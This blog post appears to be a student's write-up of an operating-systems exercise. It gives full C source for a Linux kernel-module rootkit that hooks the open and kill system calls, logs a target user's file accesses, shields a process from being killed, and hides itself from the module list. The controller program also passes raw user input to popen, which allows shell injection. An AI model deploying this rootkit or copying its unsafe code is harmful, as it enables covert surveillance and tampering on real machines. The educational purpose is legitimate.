---
title: LKM Rootkit and User Appilcation Practice
layout: post
date: '2019-04-01 02:00:00'
author: 줌코딩
tags: linux
cover: "/assets/instacode.png"
categories: os linux
---

## Practice Problem
-  Create a toy rootkit **dogdoor.ko** - three main functionalities
  - log the names of files that a user has accessed
  - prevent a kill to a specified process 
  - hide the dogdoor module from the module list
-  create a text interface /proc/dogdoor
-  Create a user-level program **bingo.c,** a CLI with the dogdoor module


## 1. Introduction

**1.1 The Dual Mode Operations**
 
As we have learned in the course, operating systems work in dual-mode or more. Usually, the mode is divided into two, user and kernel mode. For user applications, all the process runs in user mode, which means that a limited set of instructions is allowed.
When a user application requests a service from the operating system with a system call, an interrupt occurs, the system transitions from user to kernel mode. In the kernel mode OS gain the control of the computer. The system fulfills the requests of the user application. Within the dual mode, operating systems gain reliability and security.
 
**1.2 What is Loadable Kernel Modules(LKM)?**

The Loadable Kernel Modules(LKM) are modules that can be loaded and unloaded into the kernel. The LKM can provide additional functionalities to the kernel and even control the original functionalities in the kernel. In the kernel, there is a list of system calls that handle each interrupts. By the LKM, we can intercept a system call and give extra work for the kernel to do.
Without using the LKM, the kernel needs lots of memory space since it has to take care of all the drives. Moreover, the kernel has to be rebooted to rebuild every time a hardware is added or a driver is updated.
In this project, we practiced to create a LKM rootkit(**dogdoor.ko**) and a user application(**bingo.c**) that utilizes the functions of the LKM.


## 2. How to Interact between User Program and LKM

**2.1 Proc Interface**

The proc Virtual file system where files act as agents for a kernel data structure or kernel module to interact with user-level programs. It provides the internal kernel information as a file system to users.
When the module is loaded, the proc interface is created as a file to /proc. This can be read and written by users and the kernel. It can work as a communication bridge between Bingo and Dogdoor.
 
**2.2 Command Line Interface(CLI) Program using C**

For Bingo to access /proc/dogdoor, Bingo should know where the dogdoor is and what to get from or put into the house. To let him know, we use the CLI program with bingo.c. When the object is created, we pass some valuable information as parameters.
For bingo, we give two parameters, as ‘./bingo \[first\][second].’

- First : Work that Bingo can do
- Second : Things to deliver

The CLI usage can be seen with a command ‘./bingo help’.
 

Fig 1. The result of the command ‘./bingo help’

**2.3 What Bingo actually brings to the dogdoor**

Among the options that Bingo can do, ‘stalker’(not ‘stalker [username]’) does not have to write anything to the /proc/dogdoor. Other options need writing, which can be confusing to the dogdoor as it does not know what to do with the information. It means that Bingo has to specify what to do.
Therefore, I give a distinctive number for stalker, nokill and toggle.

- Stalker = 1
- Nokill = 2
- Toggle = 3

The second parameter such uid found by the username and pid will be passed with the work number at the end. I chose to pass the information as an integer type as it is easy to be parsed.
For example, if the command is ‘./bingo nokill 13535,’ then the actual data passed is ‘135352’ as 2 specifies the work for ‘nokill’.
 
**2.4 Interaction by unbuffered I/O methods**

Unbuffered I/O methods directly executes system calls inside the kernel by a function call. It sends out the file descriptor as parameter that enables operations. I chose these methods to read and write the proc file.
Bingo opened the proc file, ‘/proc/dogdoor’ with open() and parameter O_RDWR which allows writing and reading. When it requires reading the file, it calls read() method and write() method for writing.


## 3. How Dogdoor works

**3.1 Stalker (Log the file list of the given username)**

As the given source code, ‘openhook.c,’ it is allowed to intercept the system call by linking my own method to specific system call. Therefore, every time an open system call is invoked, ‘dogdoor_sys_open,’ method is called. 
In this method, it receives the ‘filename’ and ‘uid.’ If the uid is same as the saved uid, then ‘filename’ is added to ‘filelist.’ The ‘filelist’ has 10 slots to put. It has a ‘count’ variable which tells the index of array to put. When the count goes over 10, it go backs to 0, it starts overwriting the ‘filelist.’
When the user requests by reading the ‘/proc/dogdoor,’ it returns the filelist backward from the current count, which works like ‘First-In-Last-Out.’
 
**3.2 PID Savior**

To save a PID from killing, I have approached with the similar pattern of the stalker. I searched for ‘sys_kill’ index of the system call list. Then, I need to know the original ‘sys_kill’ method’s parameter to write my own kill method. Searching in the ‘elixir.bootlin.com,’ I could find the method prototype.
  
When ‘sys_kill’ is invoked, the pid is compared with the ‘saved_pid.’ It returns -1 when the pid is equal to the saved one. Otherwise, the original ‘sys_kill()’ is executed.
 
**3.3 Hiding and Showing the Module**

The idea of hiding and showing the module seems to be easy at first. If I know the array of the loaded modules, then I can remove the module from the list and add back to the list. However, I could not find the list name. The linked list in Kernel is strange at first.
         
The linked list in Kernel is weird because we put list node inside the data. It is confusing that there it seems not to have a way to reach the data. As it has two headed list, ‘prev’ and ‘next,’ the erasing was easy with ‘list_del’ method.

However, to add the module back to the list, it has to remember the head of the list. I made a global variable that remembers the ‘prev’ list of ‘THIS_MODULE.’ That way, there is no need for the listname for adding since I can reconnect ‘THIS_MODULE’s list to the remembered ‘prev’ list.
The Boolean type variable, ‘hidden,’ works as a switch to hide and show the module on the list.



## Source Code

**bingo.c**


    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <string.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    
    //for showing the help message
    void printhelp(){
      printf("\n<help>\nThe Greatest Dogdoor using the Lodable Kernel Module(LKM) \n");
      printf("Options:\n\tstalker \t\t: Print out files the specified user has been visited\n\tstalker [username] \t: Specify the user to stalk\n\tnokill [pid] \t\t: Prevent a process from killing\n\ttoggle \t\t\t: Toggle hiding and showing the dogdoor from the list\n");
    }
    
    int main(int argc, char *argv[]) {
      char buf[300];
      int fd = open("/proc/dogdoor", O_RDWR);
      //if the first parameter is not given
      if(argv[1] == NULL) printhelp();
    
      //if the first parameter is "stalker"
      else if(strcmp(argv[1], "stalker") == 0){
        if(argv[2] == NULL){
          read(fd, buf, 300);
          puts(buf);
        }
        else{
          //search uid with the argv[2] by a command id -u [username]
          char search[100] = "id -u ";
          strcat(search, argv[2]);
    
          //write the result to a file pointer
          char uid[100];
          FILE *p = popen(search, "r");
    
          //get the uid from the pointer
          if(p != NULL) {
           while(fgets(uid, sizeof(uid), p) != NULL);
          }
    
          //if the uid exists start stalking
          if(uid[0] < 58 && uid[0] > 47){
            printf("Start stalking %s.\n", argv[2]);
            int i = 0;
            while(1){
              if(uid[i] == '\n'){
                //uid + '1'
                uid[i] = 49;
                break;
              }
              i++;
            }
            //write the uid+'1' to /proc/dogdoor
            write(fd, uid, strlen(uid));
          }
    
        }
      }
    
      //if the first parameter is "nokill"
      else if(strcmp(argv[1], "nokill") == 0){
        if(argv\[2\][0]-'0'== 0) printf("nokill disabled.\n");
        else printf("Prevent pid %s from killing.\n ", argv[2]);
        //pid + '2'
        strcat(argv[2], "2");
        //write the pid +'2' to /proc/dogdoor
        write(fd, argv[2], strlen(argv[2]));
      }
    
      //if the first parameter is "toggle"
      else if(strcmp(argv[1], "toggle") == 0){
        printf("toggle hiding and showing the backdoor module.\n");
        //write '3' to /proc/dogdoor
        write(fd, "3", 5);
      }
    
      //if the first paramter is "help"
      else if(strcmp(argv[1], "help") == 0) printhelp();
    
      //other cases will be showing the alert message and help message
      else{
        printf("\nCommand not found. Check the manual below.\n\n");
        printhelp();
    
      }
      close(fd);
    
      return 0;
    
    }

**dogdoor.c**


    #include <linux/syscalls.h>
    #include <linux/module.h>
    #include <linux/proc_fs.h>
    #include <linux/seq_file.h>
    #include <linux/uaccess.h>
    #include <linux/kallsyms.h>
    #include <linux/init.h>
    #include <linux/kernel.h>
    #include <asm/unistd.h>
    #include <linux/cred.h>
    #include <linux/sched.h>
    
    
    MODULE_LICENSE("GPL");
    
    char filepath[128] = { 0x0, } ;
    char filelist\[10\][128] = { {0x0, } };
    void ** sctable ;
    int count = 0 ;
    int saved_uid = -1;
    long saved_pid = -1;
    bool hidden = false;
    struct list_head* head;
    asmlinkage long (*orig_sys_kill)(pid_t pid, int sig) ;
    asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ;
    
    //when the system call kill is intercepted
    asmlinkage long dogdoor_sys_kill(pid_t pid, int sig) {
            //if the pid is same as the saved one, it will return -1.
            if(pid == saved_pid) return -1;
            //otherwise, original system call is executed
            return orig_sys_kill(pid, sig);
    }
    
    //when the system call open is intercepted
    asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
    {
            char fname[256];
            //copy filename to fname
            copy_from_user(fname, filename, 256);
    
            //print the log of the current file accessed
            printk("%d : %s", current->cred->uid.val, fname);
    
            //if the uid is same as the saved uid, then put the filename to the filelist
            if(saved_uid - current->cred->uid.val == 0 && fname[0] != 0x0){
                    strcpy(filelist[count], fname);
                    count ++;
                    if(count == 10) count = 0;
            }
            //go back to the original system call
            return orig_sys_open(filename, flags, mode) ;
    }
    
    
    static
    int dogdoor_proc_open(struct inode *inode, struct file *file) {
            return 0 ;
    }
    
    static
    int dogdoor_proc_release(struct inode *inode, struct file *file) {
            return 0 ;
    }
    
    static
    ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset)
    {
            char buf[900] ;
            ssize_t toread ;
            int j = 0;
            j = sprintf(buf, "uid : %d\n", saved_uid);
            //if the uid is not specified yet
            if(saved_uid == -1){
                    j+= sprintf(buf, "uid is not specified.\n");
            }
    
            //if the uid is specified, print the recent 10 files that the user has accessed
            else{
                    int i = 0;
                    for(i = 0; i < 10; i ++){
                            if(--count == -1)count = 9;
                            j += sprintf(buf + j, "[%d] %s\n", i+1, filelist[count]);
                    }
            }
    
            toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;
    
            if (copy_to_user(ubuf, buf + *offset, toread))
                    return -EFAULT ;
    
            *offset = *offset + toread ;
    
            return toread ;
    }
    
    static
    ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset)
    {
            char buf[128] ;
            if (*offset != 0 || size > 128)
                    return -EFAULT ;
    
            /*        bingo will give a command as an integer
            *                the command will be like \[param\][cs]
            *                for example, the command 10001 has 1000 as param and 1 as cs
            *                (cs) 1 : stalker, 2 : nokill, 3 : toggle
            */
            int command = 0;
            int cs = -1 ;
            int param = -1;
    
            if (copy_from_user(buf, ubuf, size))
                    return -EFAULT ;
    
            //get the input as integer type command
            sscanf(buf, "%d", &command);
    
            cs = command%10;
            param = command/10;
    
            //stalker gets the uid
            if(cs == 1)        saved_uid = param;
    
            //pid savior starts working
            else if(cs == 2){
                    if(param == 0) saved_pid = -1;
                    saved_pid = param;
            }
    
            //toggle hiding and showing a module to the list
            else if(cs == 3){
                    //if hidden, read the module to the head
                    if(hidden) list_add_tail(&THIS_MODULE->list, head);
                    //else save the head and remove the module from the list
                    else{
                            head = THIS_MODULE->list.prev;
                            list_del(&THIS_MODULE->list);
                    }
                    //toggle
                    hidden = !hidden;
            }
    
    
            *offset = strlen(buf) ;
    
            return *offset ;
    }
    
    static const struct file_operations dogdoor_fops = {
            .owner =         THIS_MODULE,
            .open =         dogdoor_proc_open,
            .read =         dogdoor_proc_read,
            .write =         dogdoor_proc_write,
            .llseek =         seq_lseek,
            .release =         dogdoor_proc_release,
    } ;
    
    static
    int __init dogdoor_init(void) {
            unsigned int level ;
            pte_t * pte ;
    
            proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops) ;
    
            //get the system call table to intercept
            sctable = (void *) kallsyms_lookup_name("sys_call_table") ;
    
            //save the original system call for open and kill
            orig_sys_open = sctable[__NR_open] ;
            orig_sys_kill = sctable[37];
    
            pte = lookup_address((unsigned long) sctable, &level) ;
            if (pte->pte &~ _PAGE_RW)
                    pte->pte |= _PAGE_RW ;
    
            //intercept the call to my custmized functions
            sctable[__NR_open] = dogdoor_sys_open ;
            sctable[37] = dogdoor_sys_kill ;
    
            return 0;
    }
    
    static
    void __exit dogdoor_exit(void) {
            unsigned int level ;
            pte_t * pte ;
            remove_proc_entry("dogdoor", NULL) ;
    
            //return the original system calls
            sctable[__NR_open] = orig_sys_open ;
            sctable[37] = orig_sys_kill ;
    
            pte = lookup_address((unsigned long) sctable, &level) ;
            pte->pte = pte->pte &~ _PAGE_RW ;
    
    }
    
    module_init(dogdoor_init);
    module_exit(dogdoor_exit);

